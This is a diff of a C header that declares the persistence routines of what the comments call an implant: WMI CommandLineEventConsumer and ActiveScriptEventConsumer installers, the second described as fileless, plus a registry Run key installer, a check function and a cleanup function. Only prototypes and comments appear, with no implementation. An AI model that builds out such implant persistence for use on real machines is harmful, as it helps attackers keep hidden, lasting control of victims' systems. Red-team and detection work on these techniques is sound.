@@ -1,11 +1,28 @@
 #pragma once
 #include <windows.h>
 
-// Install WMI persistence (CommandLineEventConsumer + EventFilter)
+// -----------------------------------------------------------------------
+// WMI CommandLineEventConsumer — runs implant binary directly on trigger
+// -----------------------------------------------------------------------
 BOOL InstallWmiPersistence(const wchar_t* implantPath);
 
-// Remove WMI persistence (cleanup)
-BOOL RemoveWmiPersistence();
+// -----------------------------------------------------------------------
+// WMI ActiveScriptEventConsumer — script stored in WMI repo, no file
+// Call AFTER InstallWmiPersistence (shares the same __EventFilter)
+// -----------------------------------------------------------------------
+BOOL InstallWmiScriptPersistence(const wchar_t* implantPath);
 
-// Helper to check if already installed
+// -----------------------------------------------------------------------
+// Registry Run key — HKCU always, HKLM if elevated (no elevation req.)
+// -----------------------------------------------------------------------
+BOOL InstallRegistryPersistence(const wchar_t* implantPath);
+
+// -----------------------------------------------------------------------
+// Query: is the WMI CommandLineEventConsumer present?
+// -----------------------------------------------------------------------
 BOOL IsWmiPersistenceInstalled();
+
+// -----------------------------------------------------------------------
+// Remove all three WMI objects (binding → consumer → filter)
+// -----------------------------------------------------------------------
+BOOL RemoveWmiPersistence();
